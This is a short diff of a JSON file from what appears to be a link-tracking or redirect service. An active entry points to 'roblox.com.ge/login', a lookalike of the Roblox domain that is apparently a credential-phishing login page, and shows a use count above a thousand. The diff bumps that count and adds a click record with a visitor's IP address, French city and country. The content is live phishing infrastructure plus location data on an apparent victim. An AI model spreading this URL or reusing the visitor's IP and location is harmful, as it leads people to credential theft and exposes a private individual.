@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1008,
+    "useCount": 1009,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8179,6 +8179,14 @@
       },
       {
         "timestamp": 1777224675264,
+        "ip": "176.143.107.76",
+        "country": "France",
+        "city": "Honfleur",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
+      },
+      {
+        "timestamp": 1777224713776,
         "ip": "176.143.107.76",
         "country": "France",
         "city": "Honfleur",
